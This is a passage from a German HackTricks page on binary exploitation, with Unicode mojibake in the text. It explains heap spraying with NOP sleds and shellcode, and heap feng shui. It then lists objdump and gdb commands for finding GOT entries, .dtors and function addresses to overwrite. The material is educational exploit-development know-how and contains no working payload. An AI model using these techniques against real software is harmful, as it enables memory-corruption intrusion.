Es besteht im Wesentlichen darin, so viel Speicher wie m√∂glich f√ºr Heaps zu reservieren und diese mit einer Schicht von Nops gefolgt von einer Shellcode zu f√ºllen. Au√üerdem wird 0x0c als Polster verwendet. Es wird versucht, auf die Adresse 0x0c0c0c0c zu springen, und wenn also eine Adresse √ºberschrieben wird, die mit diesem Polster aufgerufen wird, wird dorthin gesprungen. Im Wesentlichen besteht die Taktik darin, so viel wie m√∂glich zu reservieren, um zu sehen, ob ein Pointer √ºberschrieben wird, und auf 0x0c0c0c0c zu springen, in der Hoffnung, dass dort Nops vorhanden sind.

**Heap Feng Shui**

Es besteht darin, durch Reservierungen und Freigaben den Speicher so zu strukturieren, dass reservierte St√ºcke zwischen freien St√ºcken verbleiben. Der Puffer, der √ºberlaufen werden soll, wird in einem der L√ºcken platziert.

**objdump -d ausf√ºhrbar** ‚Äî> Disas-Funktionen\
**objdump -d ./PROGRAMM | grep FUNKTION** ‚Äî> Funktionadresse erhalten\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Um sicherzustellen, dass es sich tats√§chlich um unseren Shellcode handelt und die OpCodes zu extrahieren\
**objdump -t ./exec | grep varBss** ‚Äî> Symboltabelle, um Adressen von Variablen und Funktionen zu extrahieren\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Um Adressen von Bibliotheksfunktionen (GOT) zu extrahieren\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Extrahiert die Adresse von puts, die in der GOT √ºberschrieben werden soll\
**objdump -D ./exec** ‚Äî> Disas ALL bis zu den Eintr√§gen der plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Info zur Funktion in gdb

## Interessante Kurse

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referenzen**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
